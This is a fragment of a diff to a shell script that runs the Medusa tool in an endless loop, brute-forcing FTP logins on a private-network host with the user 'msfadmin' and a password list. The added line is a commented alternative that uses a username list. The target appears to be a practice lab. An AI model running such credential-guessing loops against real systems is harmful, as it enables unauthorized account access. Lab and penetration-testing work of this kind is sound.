@@ -5,6 +5,7 @@
 
 # Define the Medusa command
 MEDUSA_CMD="medusa -h 192.168.1.100 -u msfadmin -P password_list.txt -M ftp -n 21"
+# Could also use: medusa -M ftp -h 192.168.1.100 -U username_list.txt -P password_list.txt -n 21 >> medusa_output.txt
 
 # Loop to continually run the Medusa command
 while true; do
